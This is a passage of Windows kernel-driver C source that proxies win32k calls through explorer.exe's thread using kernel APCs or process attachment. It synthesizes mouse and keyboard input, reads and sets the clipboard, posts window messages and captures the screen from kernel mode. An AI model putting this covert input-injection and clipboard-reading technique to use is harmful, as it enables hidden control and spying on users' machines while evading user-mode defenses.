				KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
				KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
				KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
				ObDereferenceObject(Ethread);
				Hwnd = Arg.Hwnd;
			}
			ObDereferenceObject(eprocess);
		}
	}
	return Hwnd;
}

UINT  SetForegroundWindow(HWND hwnd)
{
	DWORD64 RRETURN = 0;
	if (Win32k_NtUserGetForegroundWindow != 0) {
		PEPROCESS eprocess;
		if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

			HANDLE  tid = GetPrccessFirstThreadID(eprocess);
			ObDereferenceObject(eprocess);
			LOG_DEBUG("Thread ID:%d\n", tid);
			PETHREAD Ethread = 0;
			if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
			{

				RUN_APC_ARG Arg = { 0 };
				KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
				Arg.Type = ARG_NtUserCallHwndLock;
				Arg.Hwnd = hwnd;
				KAPC Apc;
				KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
				KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
				KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
				RRETURN = Arg.r;
				ObDereferenceObject(Ethread);
			}
			
		}
	}
	return (UINT)RRETURN;
}

UINT  PrintPicture(POINT StartP, DWORD with, DWORD Height, LPVOID rPtr)
{
	PEPROCESS eprocess;
	RUN_APC_ARG Arg = { 0 };
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		LOG_DEBUG("Thread ID:%d\n", tid);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_PICTURE;
			Arg.P = StartP;
			Arg.With = with;
			Arg.Height = Height;
			Arg.Ptr = rPtr;
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			//RRETURN = Arg.r;
			ObDereferenceObject(Ethread);
		}
		
	}
	return (UINT)Arg.r;
}

void  mouse_event(DWORD dwFlags, DWORD dx, DWORD dy, DWORD dwData, ULONG_PTR dwExtraInfo)
{
	DWORD v5[10] = {0}; // [rsp+20h] [rbp-38h] BYREF
	//ULONG_PTR v6; // [rsp+40h] [rbp-18h]


	//sizeof(RAWINPUT)
	//RAWINPUT
	v5[0] = 0;
	v5[6] = 0;
	v5[3] = dy;
	v5[5] = dwFlags;
	v5[2] = dx;
	v5[4] = dwData;
	*(ULONG_PTR*)&v5[8] = dwExtraInfo;

	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		LOG_DEBUG("Thread ID:%d\n", tid);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{

			RUN_APC_ARG Arg = { 0 };
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_NtUserSendInput;
			RtlCopyMemory(&Arg.KeyVal[0], v5, 40);

			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
		}
		
	}
}


typedef struct _KEYBD_INFO
{
	int v4; // [rsp+20h] [rbp-38h] BYREFi
	int v4_2;
	__int16 v5; // [rsp+28h] [rbp-30h]
	__int16 v6; // [rsp+2Ah] [rbp-2Eh]
	ULONG v7; // [rsp+2Ch] [rbp-2Ch]
	int v8; // [rsp+30h] [rbp-28h]
	int v8_2;
	ULONG_PTR v9; // [rsp+38h] [rbp-20h]
	ULONG_PTR v9_2;
}KEYBD_INFO;

void  keybd_event(BYTE bVk, BYTE bScan, DWORD dwFlags, ULONG_PTR dwExtraInfo)
{
	
	KEYBD_INFO TKeyBoard = {0};
	TKeyBoard.v7 = dwFlags;
	TKeyBoard.v4 = 1;
	TKeyBoard.v8 = 0;
	TKeyBoard.v5 = bVk;
	TKeyBoard.v6 = bScan;
	TKeyBoard.v9 = dwExtraInfo;

	//sizeof(KEYBD_INFO)

	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		LOG_DEBUG("Thread ID:%d\n", tid);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{
			RUN_APC_ARG Arg = { 0 };
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_NtUserSendInput;
			RtlCopyMemory(&Arg.KeyVal[0], &TKeyBoard, 40);
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
		}
		
	}

}





//-------------------  剪切板操作

int GetClipboardData(HWND Hwnd, wchar_t * Ptr ,PULONG pSize ) {

	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_GetClipboardData;
			Arg.Ptr = Ptr;
			Arg.Hwnd = Hwnd;
			Arg.r = 0;
			//LOG_DEBUG("Apc_Arg ID:<%p>\n", Apc_Arg);
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
			*pSize = (ULONG)Arg.r;
		}
		
	}
	else
	{

		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	//}
	return Arg.Type2;
}


BOOL SetClipboardData(HWND Hwnd, wchar_t* Ptr, ULONG nSize) {

	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_SetClipboardData;
			Arg.Ptr = Ptr;
			Arg.Hwnd = Hwnd;
			Arg.r = nSize;
			//LOG_DEBUG("Apc_Arg ID:<%p>\n", Apc_Arg);
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
		}
		
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return (BOOL)Arg.r;
}

BOOL EmptyClipboardData() {

	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_EmptyClipboardData;
			//LOG_DEBUG("Apc_Arg ID:<%p>\n", Apc_Arg);
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
		}
		
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return (BOOL)Arg.r;
}

int PostMessage(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_PostMessage;

			Arg.Msg.hWnd = hWnd;
			Arg.Msg.Msg = Msg;
			Arg.Msg.wParam = wParam;
			Arg.Msg.lParam = lParam;
			LOG_DEBUG("PostMessage hWnd:<%p> Msg<%p>  wParam<%p>  lParam<%p>\n", hWnd, Msg, wParam, lParam);
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
		}
		
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return (int)Arg.r;
}

NTSTATUS EnumDisplaySettingsExW(LPCWSTR lpszDeviceName, DWORD iModeNum, DEVMODEW* lpDevMode, DWORD dwFlags)
{
	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_NtUserEnumDisplaySettings;
			Arg.Ptr = lpDevMode;
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
		}
		
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return  (NTSTATUS)Arg.r;
}




LONG_PTR _Kernel_SetWindowLongPtr(HWND hWnd, int nIndex, LONG_PTR dwNewLong, DWORD64 Flags)
{
	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		ObDereferenceObject(eprocess);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_NtUserSetWindowLongPtr;
			Arg.Hwnd = hWnd;
			Arg.Msg.lParam = nIndex;
			Arg.Msg.wParam = dwNewLong;
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
		}

	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return  (NTSTATUS)Arg.r;







	return 0;
}

#else



UINT  ClientToScreen_Kernel(UINT Hwnd, LPPOINT lpPoint)
{
	//HWND Hwnd = 0;
	//if (Win32k_NtUserFindWindowEx != 0) {


	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		LOG_DEBUG("Thread ID:<%p>\n", tid);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{

			RUN_APC_ARG Arg = { 0 };
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_ClientToSccreen;
			Arg.P.x = lpPoint->x;
			Arg.P.y = lpPoint->y;
			Arg.Hwnd = Hwnd;
			//LOG_DEBUG("Apc_Arg ID:<%p>\n", Apc_Arg);
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKKERNEL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
			*lpPoint = Arg.P;
			LOG_DEBUG("Hwnd x %d y %d\n", lpPoint->x, lpPoint->y);
		}
		ObDereferenceObject(eprocess);
	}
	else
	{

		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	//}
	return 0;
}

UINT  FindWindowW(PUNICODE_STRING lpClassName, PUNICODE_STRING lpWindowName)
{
	HWND Hwnd = 0;
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {
	

		KAPC_STATE Apc;
		KeStackAttachProcess(eprocess, &Apc);
		PVOID addr = 0;
		size_t size = PAGE_SIZE;
		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
		if (NT_SUCCESS(status)) {

			RtlZeroMemory(addr, PAGE_SIZE);
			
			char* _Begin = addr;
			wchar_t* pClass = _Begin;
			wchar_t* pWindow = _Begin + 0x200;

			PUNICODE_STRING pUnicodeClass = _Begin + 0x800;
			PUNICODE_STRING pUnicodeWindow = _Begin + 0x800 + sizeof(UNICODE_STRING);
			RtlCopyMemory(pClass, lpClassName->Buffer, lpClassName->Length);
			RtlCopyMemory(pWindow, lpWindowName->Buffer, lpWindowName->Length);

			RtlInitUnicodeString(pUnicodeClass, pClass);
			RtlInitUnicodeString(pUnicodeWindow, pWindow);
			//RtlCopyMemory(Arg->lpClassName->Buffer)

			LOG_DEBUG("------------%wZ %wZ \n", pUnicodeClass, pUnicodeWindow);

			Hwnd = Win32k_NtUserFindWindowEx(0i64, 0i64, pUnicodeClass, pUnicodeWindow, 0);
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		}
		KeUnstackDetachProcess(&Apc);
		ObDereferenceObject(eprocess);
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	//}
	return Hwnd;
}

UINT  GetForegroundWindow()
{
	HWND Hwnd = 0;
	if (Win32k_NtUserGetForegroundWindow != 0) {

		PEPROCESS eprocess;
		if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

			KAPC_STATE Apc;
			KeStackAttachProcess(eprocess, &Apc);

			Hwnd = Win32k_NtUserGetForegroundWindow();
			LOG_DEBUG(" %08X\n", Hwnd);
			KeUnstackDetachProcess(&Apc);
			ObDereferenceObject(eprocess);
		}
	}
	return Hwnd;
}

UINT  SetForegroundWindow(UINT hwnd)
{
	if (Win32k_NtUserGetForegroundWindow != 0) {
		PEPROCESS eprocess;
		if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

			KAPC_STATE Apc;
			KeStackAttachProcess(eprocess, &Apc);

			NTSTATUS r =  Win32k_NtUserCallHwndLock(hwnd, SET_FORE_WINDW);

			LOG_DEBUG(" %08X\n", r);

			KeUnstackDetachProcess(&Apc);
			ObDereferenceObject(eprocess);
		}
	}
	return 0;
}

void  mouse_event(DWORD dwFlags, DWORD dx, DWORD dy, DWORD dwData, ULONG_PTR dwExtraInfo)
{
	DWORD v5[10] = { 0 }; // [rsp+20h] [rbp-38h] BYREF
	//ULONG_PTR v6; // [rsp+40h] [rbp-18h]

	v5[0] = 0;
	v5[6] = 0;
	v5[3] = dy;
	v5[5] = dwFlags;
	v5[2] = dx;
	v5[4] = dwData;
	*(ULONG_PTR*)&v5[8] = dwExtraInfo;

	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		KAPC_STATE Apc;
		KeStackAttachProcess(eprocess, &Apc);

		PVOID addr = 0;
		size_t size = 100;
		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (NT_SUCCESS(status)) {

			RtlCopyMemory(addr, &v5[0], 40);
			DWORD64 Ps = Win32k_NtUserSendInput(1, addr, 40);
			LOG_DEBUG(" Win32k_NtUserSendInput r <%p>\n", Ps);
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		}

		KeUnstackDetachProcess(&Apc);
		ObDereferenceObject(eprocess);
	}
}

typedef struct _KEYBD_INFO
{
	int v4; // [rsp+20h] [rbp-38h] BYREFi
	int v4_2;
	__int16 v5; // [rsp+28h] [rbp-30h]
	__int16 v6; // [rsp+2Ah] [rbp-2Eh]
	ULONG v7; // [rsp+2Ch] [rbp-2Ch]
	int v8; // [rsp+30h] [rbp-28h]
	int v8_2;
	ULONG_PTR v9; // [rsp+38h] [rbp-20h]
	ULONG_PTR v9_2;
}KEYBD_INFO;

void  keybd_event(BYTE bVk, BYTE bScan, DWORD dwFlags, ULONG_PTR dwExtraInfo)
{

	KEYBD_INFO TKeyBoard = { 0 };
	TKeyBoard.v7 = dwFlags;
	TKeyBoard.v4 = 1;
	TKeyBoard.v8 = 0;
	TKeyBoard.v5 = bVk;
	TKeyBoard.v6 = bScan;
	TKeyBoard.v9 = dwExtraInfo;

	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		KAPC_STATE Apc;
		KeStackAttachProcess(eprocess, &Apc);

		PVOID addr = 0;
		size_t size = 100;
		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (NT_SUCCESS(status)) {

			RtlCopyMemory(addr, &TKeyBoard, 40);
			DWORD64 Ps = Win32k_NtUserSendInput(1, addr, 40);
			LOG_DEBUG(" Win32k_NtUserSendInput KeyBoard r <%p>\n", Ps);
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		}

		KeUnstackDetachProcess(&Apc);
		ObDereferenceObject(eprocess);
	}

}
//-------------------  剪切板操作

int GetClipboardData(UINT Hwnd, wchar_t* Ptr, PULONG pSize) {

	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	int Type = 0;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		KAPC_STATE Apc;
		KeStackAttachProcess(eprocess, &Apc);



		PVOID addr = 0;
		size_t size = 0x100;
		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (NT_SUCCESS(status))
		{
			//LOG_DEBUG("ARG_GetClipboardData\n");
			PULONG pFlags = addr;
			if (Win32k_NtUserOpenClipboard(Hwnd, pFlags))
			{
				//LOG_DEBUG("ARG_GetClipboardData\n");
				HANDLE hClipboard = Win32k_NtUserGetClipboardData(CF_UNICODETEXT, pFlags);
				if (CF_UNICODETEXT == *pFlags)
				{
					//LOG_DEBUG("ARG_GetClipboardData\n");
					if (hClipboard)
					{
						//LOG_DEBUG("ARG_GetClipboardData\n");
						ULONG nSize = 0;
						HANDLE LocalEnhMetaFile = CreateLocalMemHandle(hClipboard, &nSize, pFlags);
						if (LocalEnhMetaFile != 0) {

							int Len = wcsnlen_s((wchar_t*)LocalEnhMetaFile, nSize);
							//LOG_DEBUG("ARG_GetClipboardData  <%p>  <%d> <%d>  %ws\n", LocalEnhMetaFile, nSize, Len, (wchar_t *)LocalEnhMetaFile);
							RtlCopyMemory(Ptr, LocalEnhMetaFile, (Len + 1) * 2);
							*pSize = (Len + 1) * 2;
							Type = 13;
							ZwFreeVirtualMemory(ZwCurrentProcess(), &LocalEnhMetaFile, &nSize, MEM_RELEASE);
						}
					}
				}
				else if (*pFlags == 1)
				{
					if (hClipboard)
					{
						//LOG_DEBUG("ARG_GetClipboardData\n");
						ULONG nSize = 0;
						HANDLE LocalEnhMetaFile = CreateLocalMemHandle(hClipboard, &nSize, pFlags);
						if (LocalEnhMetaFile != 0) {

							int Len = strnlen_s((char*)LocalEnhMetaFile, nSize);
							//LOG_DEBUG("ARG_GetClipboardData  <%p>  <%d> <%d>  %ws\n", LocalEnhMetaFile, nSize, Len, (wchar_t *)LocalEnhMetaFile);
							RtlCopyMemory(Ptr, LocalEnhMetaFile, Len + 1);
							*pSize = Len + 1;
							Type = 1;
							ZwFreeVirtualMemory(ZwCurrentProcess(), &LocalEnhMetaFile, &nSize, MEM_RELEASE);
						}
					}
				}



				Win32k_NtUserCloseClipboard();
			}
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		}
		KeUnstackDetachProcess(&Apc);
		ObDereferenceObject(eprocess);
	}
	else
	{

		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	//}
	return Type;
}

BOOL SetClipboardData(UINT Hwnd, wchar_t* Ptr, ULONG nSize) {

	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		KAPC_STATE Apc;
		KeStackAttachProcess(eprocess, &Apc);

		PVOID addr = 0;
		size_t size = 0x100;
		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
		if (NT_SUCCESS(status))
		{
			//LOG_DEBUG("ARG_GetClipboardData\n");
			LOG_DEBUG("ARG_SetClipboardData\n");
			PULONG pFlags = addr;
			void* Addr = (char*)addr + 8;
			if (Win32k_NtUserOpenClipboard(Hwnd, pFlags))
			{
				LOG_DEBUG("ARG_SetClipboardData\n");
				//LOG_DEBUG("ARG_GetClipboardData\n");
				HANDLE hMem = ConvertMemHandle(Ptr, &nSize, &Addr);
				if (hMem)
				{
					LOG_DEBUG("ARG_SetClipboardData\n");
					HANDLE hClipboard = Win32k_NtUserSetClipboardData(CF_UNICODETEXT, hMem, pFlags);

					LOG_DEBUG("ARG_SetClipboardData  <%p>\n", hClipboard);

					ZwFreeVirtualMemory(ZwCurrentProcess(), Addr, &nSize, MEM_RELEASE);
				}
				Win32k_NtUserCloseClipboard();
			}
			ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		}

		KeUnstackDetachProcess(&Apc);
		ObDereferenceObject(eprocess);
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return Arg.r;
}

BOOL EmptyClipboardData() {

	RUN_APC_ARG Arg = { 0 };
	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		KAPC_STATE Apc;
		KeStackAttachProcess(eprocess, &Apc);

		Win32k_NtUserEmptyClipboard();

		KeUnstackDetachProcess(&Apc);
		ObDereferenceObject(eprocess);
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return Arg.r;
}



















#endif



//------------------------------------------------------
//------------------------------------------------------





